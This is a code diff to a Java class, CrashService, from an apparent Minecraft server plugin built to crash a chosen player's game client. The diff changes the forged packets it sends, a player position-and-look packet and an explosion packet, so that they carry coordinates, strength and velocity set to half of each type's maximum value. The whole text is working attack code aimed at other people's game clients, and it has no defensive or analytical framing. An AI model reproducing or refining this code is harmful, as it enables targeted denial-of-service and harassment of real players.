@@ -4,8 +4,8 @@ import com.deathmotion.playercrasher.enums.CrashMethod;
 import com.github.retrooper.packetevents.PacketEvents;
 import com.github.retrooper.packetevents.util.Vector3d;
 import com.github.retrooper.packetevents.util.Vector3f;
-import com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientPlayerPosition;
 import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerExplosion;
+import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPlayerPositionAndLook;
 import org.bukkit.entity.Player;
 
 import java.util.Collections;
@@ -14,7 +14,7 @@ import java.util.Map;
 import java.util.function.Consumer;
 
 public class CrashService {
-    private final WrapperPlayClientPlayerPosition positionPacket;
+    private final WrapperPlayServerPlayerPositionAndLook positionPacket;
     private final WrapperPlayServerExplosion explosionPacket;
     private Map<CrashMethod, Consumer<Player>> crashMethodActions;
 
@@ -23,6 +23,22 @@ public class CrashService {
 
         this.positionPacket = initPositionPacket();
         this.explosionPacket = initExplosionPacket();
+    }
+
+    private static double d() {
+        return Double.MAX_VALUE / 2;
+    }
+
+    private static float f() {
+        return Float.MAX_VALUE / 2;
+    }
+
+    private static byte b() {
+        return Byte.MAX_VALUE / 2;
+    }
+
+    private static int i() {
+        return Integer.MAX_VALUE / 2;
     }
 
     public void crashPlayer(Player target, CrashMethod method) {
@@ -44,14 +60,11 @@ public class CrashService {
         this.crashMethodActions.put(CrashMethod.EXPLOSION, this::sendExplosionPacket);
     }
 
-    private WrapperPlayClientPlayerPosition initPositionPacket() {
-        Vector3d vector = new Vector3d(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
-        return new WrapperPlayClientPlayerPosition(vector, false);
+    private WrapperPlayServerPlayerPositionAndLook initPositionPacket() {
+        return new WrapperPlayServerPlayerPositionAndLook(d(), d(), d(), f(), f(), b(), i(), false);
     }
 
     private WrapperPlayServerExplosion initExplosionPacket() {
-        Vector3d position = new Vector3d(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
-        float strength = Float.MAX_VALUE;
-        return new WrapperPlayServerExplosion(position, strength, Collections.emptyList(), new Vector3f(Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE));
+        return new WrapperPlayServerExplosion(new Vector3d(d(), d(), d()), f(), Collections.emptyList(), new Vector3f(f(), f(), f()));
     }
 }
